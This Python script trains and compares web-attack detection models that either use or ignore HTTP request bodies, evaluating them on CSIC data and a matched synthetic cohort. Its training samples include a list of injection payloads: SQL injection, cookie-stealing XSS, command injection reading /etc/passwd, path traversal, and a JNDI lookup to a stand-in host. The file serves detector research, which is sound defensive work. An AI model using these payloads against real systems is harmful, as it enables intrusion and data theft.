# SPDX-License-Identifier: Apache-2.0
"""A/B test: does adding body-aware features actually improve real-attack
detection? Trains two models on the SAME captured traffic — one on the shipped
16 URI+header features, one on the 22 (16 + 6 body) — and evaluates BOTH on the
real CSIC sample (which puts attacks in POST bodies). The delta on CSIC is the
verdict.

    python3 ml/attack_lab/train_body.py
"""

from __future__ import annotations

import json
import os
import sys
import urllib.parse

import numpy as np
import torch

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))

from features import extract_features  # noqa: E402  (16-dim baseline)
from features_body import extract_ext  # noqa: E402  (22-dim)
from train import Scorer, metrics  # noqa: E402

TRAFFIC = os.path.join(HERE, "..", "corpus", "traffic")
CSIC = os.path.join(HERE, "..", "corpus", "csic")
METHODS = ("GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH")


def load(path):
    return [json.loads(l) for l in open(path, encoding="utf-8")] if os.path.exists(path) else []


def parse_csic(path):
    """CSIC raw dump -> records with method/uri/headers/body (body = lines after
    the header blank line, up to the next request)."""
    reqs, cur, in_body = [], None, False
    for line in open(path, encoding="latin-1"):
        line = line.rstrip("\r\n")
        toks = line.split(" ")
        if toks and toks[0] in METHODS and len(toks) > 1 and ("://" in line or toks[1].startswith("/")):
            if cur:
                reqs.append(cur)
            p = urllib.parse.urlsplit(toks[1])
            cur = {"method": toks[0], "uri": (p.path + ("?" + p.query if p.query else "")) or "/",
                   "headers": [], "body": ""}
            in_body = False
        elif cur is None:
            continue
        elif not in_body and line == "":
            in_body = True
        elif not in_body and ":" in line:
            k, _, v = line.partition(":")
            cur["headers"].append((k.strip(), v.strip()))
        elif in_body and line:
            cur["body"] += line
    if cur:
        reqs.append(cur)
    return reqs


def train_eval(dim, feat, atk, ben, csic_norm, csic_anom, seed=1337):
    rng = np.random.default_rng(seed)
    torch.manual_seed(seed)
    k = min(len(atk), len(ben))
    a = [atk[i] for i in rng.permutation(len(atk))[:k]]
    b = [ben[i] for i in rng.permutation(len(ben))[:k]]
    X = np.array([feat(r) for r in a + b], dtype=np.float32)
    y = np.array([1] * k + [0] * k, dtype=np.float32)
    pm = rng.permutation(len(y)); X, y = X[pm], y[pm]
    cut = int(0.8 * len(y))
    model = Scorer(dim, 24)
    opt = torch.optim.Adam(model.parameters(), lr=2e-3, weight_decay=1e-5)
    lossf = torch.nn.BCELoss()
    ds = torch.utils.data.TensorDataset(torch.from_numpy(X[:cut]), torch.from_numpy(y[:cut]).unsqueeze(1))
    dl = torch.utils.data.DataLoader(ds, batch_size=256, shuffle=True)
    model.train()
    for _ in range(120):
        for xb, yb in dl:
            opt.zero_grad(); loss = lossf(model(xb), yb); loss.backward(); opt.step()
    model.eval()

    def score(recs):
        with torch.no_grad():
            return np.clip(model(torch.from_numpy(np.array([feat(r) for r in recs], dtype=np.float32))).squeeze(1).numpy(), 0, 1)

    # in-distribution on the held-out split
    with torch.no_grad():
        pte = np.clip(model(torch.from_numpy(X[cut:])).squeeze(1).numpy(), 0, 1)
    mid = metrics(y[cut:], pte)
    sn, sa = score(csic_norm), score(csic_anom)
    return mid, sn, sa, model


def rec_from_traffic(r):
    return {"method": r["method"], "uri": r["uri"], "headers": [tuple(h) for h in r["headers"]], "body": r.get("body", "")}


# Real, public injection payloads for the matched-cohort body (canonical vectors).
_ATTACK_BODIES = [
    "' OR '1'='1' -- ", "'; DROP TABLE users; --", "1 UNION SELECT username,password FROM users",
    "<script>alert(document.cookie)</script>", "<img src=x onerror=alert(1)>",
    "; cat /etc/passwd", "| whoami", "$(sleep 5)", "../../../../etc/passwd",
    "%27%20OR%201=1--", "{{7*7}}", "${jndi:ldap://evil/x}", "admin'--",
]
_BENIGN_BODIES = [
    "John Smith", "office chair", "please deliver on monday", "42", "wireless mouse",
    "great product, works perfectly", "Jamón Ibérico", "invoice #2024-118", "blue, size L",
    "call me on arrival", "gift wrap please", "2 boxes", "thanks for the fast shipping",
]


def matched_cohort(n=4000, seed=7):
    """DECISIVE isolation: benign and attack records that are IDENTICAL in
    method+uri+headers and differ ONLY in the body content. The 16-feature model
    is body-blind, so on this cohort it is mathematically at chance (identical
    inputs for both classes -> AUC ~0.5). If the 22-feature model separates them,
    body features carry real signal; if it can't, the features themselves are
    inadequate. No confound possible — every non-body dimension is held equal."""
    import random
    rng = random.Random(seed)
    uris = ["/api/v1/users", "/api/v1/orders", "/submit", "/comments", "/search", "/api/v1/items"]
    uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120", "curl/8.4.0", "python-requests/2.31"]
    ctypes = ["application/json", "application/x-www-form-urlencoded"]
    recs, labels = [], []
    for i in range(n):
        # One shared header+uri+method context, used for BOTH a benign and an attack record.
        uri, ua, ct = rng.choice(uris), rng.choice(uas), rng.choice(ctypes)
        auth = [("authorization", "Bearer " + "".join(rng.choice("0123456789abcdef") for _ in range(24)))] if rng.random() < 0.5 else []
        hdr = [("user-agent", ua), ("content-type", ct)] + auth
        ctx = {"method": "POST", "uri": uri, "headers": hdr}
        bb, ba = rng.choice(_BENIGN_BODIES), rng.choice(_ATTACK_BODIES)
        if ct == "application/json":
            field = rng.choice(["name", "q", "comment", "value"])
            bb, ba = json.dumps({field: bb}), json.dumps({field: ba})
        else:
            field = rng.choice(["name", "q", "comment", "value"])
            bb = f"{field}={urllib.parse.quote_plus(bb)}"
            ba = f"{field}={urllib.parse.quote_plus(ba)}"
        recs.append({**ctx, "body": bb}); labels.append(0)
        recs.append({**ctx, "body": ba}); labels.append(1)
    return recs, np.array(labels, dtype=np.float32)


def run_matched_cohort():
    """Train 16 vs 22 on the matched cohort where body is the ONLY signal."""
    recs, y = matched_cohort()
    rng = np.random.default_rng(0)
    pm = rng.permutation(len(y)); recs = [recs[i] for i in pm]; y = y[pm]
    cut = int(0.8 * len(y))
    print("\n  ══ DECISIVE: matched cohort (same method+uri+headers, body is the ONLY difference) ══")
    for name, dim, feat in [("16  URI+header", 16, lambda r: list(extract_features(r["method"], r["uri"], r["headers"]))),
                            ("22  +body", 22, lambda r: extract_ext(r["method"], r["uri"], r["headers"], r["body"]))]:
        X = np.array([feat(r) for r in recs], dtype=np.float32)
        torch.manual_seed(0)
        model = Scorer(dim, 24)
        opt = torch.optim.Adam(model.parameters(), lr=2e-3, weight_decay=1e-5)
        lossf = torch.nn.BCELoss()
        ds = torch.utils.data.TensorDataset(torch.from_numpy(X[:cut]), torch.from_numpy(y[:cut]).unsqueeze(1))
        dl = torch.utils.data.DataLoader(ds, batch_size=256, shuffle=True)
        model.train()
        for _ in range(150):
            for xb, yb in dl:
                opt.zero_grad(); loss = lossf(model(xb), yb); loss.backward(); opt.step()
        model.eval()
        with torch.no_grad():
            pte = np.clip(model(torch.from_numpy(X[cut:])).squeeze(1).numpy(), 0, 1)
        m = metrics(y[cut:], pte)
        print(f"     {name:<14}  held-out AUC={m['auc']:.4f}  F1={m['f1']:.3f}  (body-only separability)")


def main():
    atk = [rec_from_traffic(r) for r in load(os.path.join(TRAFFIC, "attack.jsonl"))]
    ben = [rec_from_traffic(r) for r in load(os.path.join(TRAFFIC, "benign.jsonl"))]
    csic_norm = parse_csic(os.path.join(CSIC, "normal_sample.txt"))
    csic_anom = parse_csic(os.path.join(CSIC, "anomalous_sample.txt"))
    print(f"  traffic: {len(atk)} attack / {len(ben)} benign  |  CSIC: {len(csic_norm)} normal / {len(csic_anom)} anomalous")
    print(f"  CSIC anomalous with a body: {sum(1 for r in csic_anom if r['body'])}/{len(csic_anom)}")

    f16 = lambda r: list(extract_features(r["method"], r["uri"], r["headers"]))
    f22 = lambda r: extract_ext(r["method"], r["uri"], r["headers"], r["body"])

    # Controlled probe: SAME method+uri+headers, only the body differs. The
    # 16-feature model is blind to the body (identical features -> identical
    # score); the 22-feature model should separate them.
    hdr = [("user-agent", "curl/8"), ("content-type", "application/json")]
    probe_benign = {"method": "POST", "uri": "/api/v1/users", "headers": hdr,
                    "body": json.dumps({"name": "John Smith", "age": 30, "city": "Rome"})}
    probe_attack = {"method": "POST", "uri": "/api/v1/users", "headers": hdr,
                    "body": json.dumps({"name": "' OR '1'='1' UNION SELECT password FROM users--",
                                        "q": "<script>alert(document.cookie)</script>"})}

    models = {}
    for name, dim, feat in [("16  URI+header", 16, f16), ("22  +body", 22, f22)]:
        mid, sn, sa, model = train_eval(dim, feat, atk, ben, csic_norm, csic_anom)
        models[name] = (model, feat)
        hn = int((sn >= 0.5).sum()); ha = int((sa >= 0.5).sum())
        print(f"\n  ── {name} ── in-dist AUC={mid['auc']:.4f}")
        print(f"     CSIC normal    mean={sn.mean():.3f}  flagged≥0.5: {hn}/{len(sn)} ({100*hn/len(sn):.0f}% FP)")
        print(f"     CSIC anomalous mean={sa.mean():.3f}  detected≥0.5: {ha}/{len(sa)} ({100*ha/max(len(sa),1):.0f}%)")

    print("\n  ══ controlled probe: same POST /api/v1/users, body benign vs attack ══")
    for name, (model, feat) in models.items():
        def sc(r):
            with torch.no_grad():
                return float(np.clip(model(torch.from_numpy(np.array([feat(r)], dtype=np.float32))).squeeze().numpy(), 0, 1))
        print(f"     {name:<14}  benign-body={sc(probe_benign):.3f}   attack-body={sc(probe_attack):.3f}")

    run_matched_cohort()


if __name__ == "__main__":
    main()
